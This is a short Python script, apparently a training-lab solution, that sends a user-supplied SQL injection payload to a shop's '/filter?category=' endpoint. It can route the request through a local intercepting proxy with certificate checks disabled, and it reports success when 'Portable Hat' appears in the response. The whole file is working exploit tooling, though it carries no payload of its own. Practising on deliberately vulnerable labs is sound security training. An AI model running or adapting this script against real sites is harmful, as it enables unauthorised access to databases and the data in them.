import argparse
import requests
import urllib3
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

SUCCESS_INDICATOR = "Portable Hat"


def normalize_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def exploit_sqli(url, payload, use_proxy):
    endpoint = "/filter?category="
    payload = quote(payload, safe="")
    target = urljoin(url, endpoint + payload)

    try:
        r = requests.get(
            target,
            verify=False,
            timeout=10,
            proxies=PROXIES if use_proxy else None,
        )
        return SUCCESS_INDICATOR in r.text
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--proxy", action="store_true")
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("payload", nargs="?", help="Payload")

    args = parser.parse_args()

    # Ask interactively if missing
    url = args.url or input("Enter target URL: ").strip()
    payload = args.payload or input("Enter payload: ").strip()

    url = normalize_url(url)

    if exploit_sqli(url, payload, args.proxy):
        print("[+] SQL injection likely successful")
    else:
        print("[-] SQL injection unsuccessful")


if __name__ == "__main__":
    main()
